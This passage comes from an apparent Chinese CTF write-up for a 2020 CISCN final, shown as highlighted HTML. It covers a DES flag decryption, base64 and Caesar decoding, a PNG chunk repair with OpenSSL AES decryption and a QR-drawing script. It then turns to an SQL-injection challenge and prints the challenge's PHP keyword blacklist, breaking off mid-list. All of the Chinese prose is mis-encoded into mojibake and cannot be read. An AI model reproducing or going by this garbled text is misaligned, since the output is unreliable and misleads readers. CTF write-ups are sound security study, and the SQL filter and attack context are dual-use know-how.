key<span class="token punctuation">)</span>x <span class="token operator">=</span> inv_peak<span class="token punctuation">(</span>x<span class="token punctuation">)</span>x <span class="token operator">=</span> inv_lock<span class="token punctuation">(</span>x<span class="token punctuation">)</span>x <span class="token operator">=</span> inv_rise<span class="token punctuation">(</span>x<span class="token punctuation">,</span> key<span class="token punctuation">)</span>x <span class="token operator">=</span> inv_peak<span class="token punctuation">(</span>x<span class="token punctuation">)</span>x <span class="token operator">=</span> inv_lock<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># [35, 239, 81, 231, 237, 218, 108, 166]</span></code></pre><p>å¾—åˆ° <code>secret</code> ä¸º <code>[35, 239, 81, 231, 237, 218, 108, 166]</code>ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>    <span class="token string">"0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c"</span><span class="token punctuation">)</span><span class="token comment"># æˆ–è€… </span><span class="token comment"># import binascii</span><span class="token comment"># flag = binascii.unhexlify(</span><span class="token comment">#     "0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c")</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> DESd <span class="token operator">=</span> DES<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">,</span> DES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'flag{lock_peak_rise_repeat_2333_7481233}'</span></code></pre><p>å¾—åˆ° flagã€‚</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><blockquote><p>c3ludHt0MmpkZ2dqc2NuYTM2ZWwyfQ==</p></blockquote><p>base64 decode</p><blockquote><p>synt{t2jdggjscna36el2}</p></blockquote><p>å‡¯æ’’</p><blockquote><p>flag{g2wqttwfpan36ry2}</p></blockquote><h3 id="BadPic"><a href="#BadPic" class="headerlink" title="BadPic"></a>BadPic</h3><p>å›¾ç‰‡æ®‹ç¼ºäº†ï¼Œæ‹–è¿› 010editor é‡Œä¸€çœ‹ï¼Œå‘ç°æ–‡ä»¶æœ€åé¢æœ‰ä¸€å †å­—ç¬¦ä¸²ï¼Œbase64è§£å¯†å‘ç°ä»¥ <code>Salted</code>å¼€å¤´ï¼Œç›²çŒœç”¨äº† openssl ä»€ä¹ˆåŠ å¯†å§ã€‚</p><p>å¦å¤– <code>PNG_CHUNK chunk[8]</code> çš„ length ä¸º 0ã€‚</p><p>äºæ˜¯å…ˆæ‰‹åŠ¨ç®—äº†ç®—å†è¯•äº†è¯•é•¿åº¦ï¼Œæ˜¯ 21535ã€‚<em>ï¼ˆæœ‰æ²¡æœ‰ä»€ä¹ˆè„šæœ¬èƒ½ç›´æ¥ç®—çš„å”‰ï¼Œæ‰‹ç®—æ„Ÿè§‰å¥½è ¢</em></p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006022740538.png" alt="ä¿®æ”¹length"></p><p>ä¿®æ”¹åå¾—åˆ°å®Œæ•´çš„å›¾ç‰‡ã€‚</p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006174706848.png" alt="apache"></p><p><code>apache</code>ï¼Œè¿™ä¸ªåº”è¯¥å°±æ˜¯åŠ å¯†çš„å¯†é’¥äº†ã€‚</p><p>æŠŠå›¾ç‰‡æœ«å°¾çš„å­—ç¬¦ä¸²ç»™æå–å‡ºæ¥ï¼Œå»æ‰ <code>IDAT</code> ç­‰æ ‡è¯†ï¼ˆè¿˜æ˜¯å¤ç°çš„æ—¶å€™å‘ç°è¦è¿™æ ·æ•´ï¼‰ï¼Œåˆå¹¶ä¸¤æ®µ chunkã€‚</p><pre class="language-none"><code class="language-none">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</code></pre><p>ç„¶åæ‹¿è¿™ä¸ªå» <a href="https://tool.oschina.net/encrypt">https://tool.oschina.net/encrypt</a> åœ¨çº¿è§£å¯†ï¼ŒAESï¼Œå¯†é’¥ä¸º <code>apache</code>ã€‚</p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006030709979.png" alt="aes"></p><blockquote><p>æˆ–è€… <strong>openssl è§£å¯†</strong> </p><p>ï¼ˆè¿™å‚æ•°è°çŸ¥é“å°±æ˜¯ aes256 å‘¢ï¼Œéš¾ä¸æˆçˆ†ç ´ï¼Ÿï¼‰</p><p>å…ˆæŠŠä¸Šé¢çš„å¯†æ–‡å­˜åˆ° <code>enc.txt</code>ï¼Œè€Œåæ‰§è¡Œä¸‹é¢çš„è¿™ä¸ªï¼Œè¾“å‡ºä¿å­˜åˆ° <code>out.txt</code> æ–‡ä»¶ä¸­ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> enc.txt <span class="token operator">|</span> base64 -d <span class="token operator">|</span> openssl enc -aes256 -salt -d -out out.txt -pass pass:apache -md md5</code></pre><blockquote><p>å¦å¤–å¤§ä½¬æé†’è¯´ï¼Œopenssl 1.1ç‰ˆæœ¬ä»¥ä¸Šé»˜è®¤çš„hashä¸æ˜¯md5ï¼Œä½ç‰ˆæœ¬çš„æ˜¯md5ã€‚</p></blockquote><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006032104223.png" alt="openssl"></p></blockquote><p>å¾—åˆ°ä¸€å †çš„01å­—ç¬¦ä¸²ï¼Œä¼°è®¡å°±æ˜¯äºŒç»´ç äº†å•¦ï¼</p><p>ç»Ÿè®¡ä¸€ä¸‹é•¿åº¦ä¸º4900ï¼Œæ­£å¥½70*70.</p><p>å†™ä¸ªä¸‘é™‹çš„jioæœ¬æŠŠäºŒç»´ç ç”»å‡ºæ¥ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> numpy <span class="token keyword">as</span> nptable <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            table<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            table<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        i <span class="token operator">+=</span> <span class="token number">1</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">255</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> row<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> table<span class="token punctuation">]</span>qrcode <span class="token operator">=</span> Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">(</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>qrcode<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>qrcode<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">r"./qr.png"</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°äºŒç»´ç å¦‚ä¸‹ã€‚</p><p><img src="/2020/10/06/CTF_2020CISCN_final/qr.png" alt="qr"></p><p>æ‰«ç å¾—åˆ° flagã€‚</p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006031143135.png" alt="qrcode"></p><p><code>flag{lakks1qw23eeeaw345tywqiqajsajdwajdai}</code></p><p><em>ï¼ˆå¯»æ€ç€ç°åœºæ–­ç½‘ç¯å¢ƒåšå‡ºæ¥ä¹Ÿå¤ªå¼ºäº†å§ï¼Œæ€•ä¸æ˜¯ openssl å‚æ•°æŒæ¡çš„å¾ˆç†Ÿç»ƒï¼Œè¦ä¸ç„¶å°±æ˜¯å·å·ä¸Šç½‘äº†ï¼Ÿ</em> </p><p><em>ï¼ˆMisc ç¢°ä¸Š Crypto å°±å¾ˆå¤´ç§ƒ</em>  <small>ï¼ˆå°å£°bb</small></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1-ezsql"><a href="#Web1-ezsql" class="headerlink" title="Web1 ezsql"></a>Web1 ezsql</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Get The Flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--     $query = "SELECT * FROM fake_flag WHERE id = $id limit 0,$limit";    //$query = "SELECT flag FROM real_flag WHERE id = $id limit 0,$limit";--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            yourt id        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>limit<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get it<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn<span class="token punctuation">"</span></span> <span class="token attr-name">btn-info</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><p>æ˜¯é“ <strong>SQL æ³¨å…¥</strong>çš„é¢˜ã€‚æ ¹æ®æç¤ºçœŸæ­£çš„ flag åœ¨ <code>real_flag</code> è¿™ä¸ªè¡¨é‡Œï¼Œä¸”å­—æ®µåä¸º <code>flag</code>ï¼Œéœ€è¦é€šè¿‡ <code>id</code> å’Œ <code>limit</code> è¿™ä¸¤ä¸ªå‚æ•°æ¥æ³¨å…¥ã€‚</p><p>ç°åœºè¯•äº†å‘ç°ä¸€å †å…³é”®å­—éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œ<code>UNION</code>ã€<code>SUBSTR</code> ä¸å¯è¡Œï¼Œ<code>'</code> <code>"</code> <code>/**/</code> <code>()</code> ç­‰ç­‰éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œåªèƒ½ç›²æ³¨äº†ã€‚</p><p>ç„¶è€Œè¯•äº†å¾ˆå¤šéƒ½æ²¡è¢«è¿‡æ»¤äº†è‰â€¦â€¦</p><p>æœ€å fix çš„æ—¶å€™å‘ç°è¯»å–æ•°æ®åº“ç›¸å…³çš„æºç é•¿ä¸‹é¢è¿™æ ·ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">is_safe</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$common_blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"%"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"^"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"`"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"|"</span> <span class="token punctuation">,</span><span class="token string single-quoted-string">'between'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'not'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"like"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">','</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$hack_list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'union'</span><span 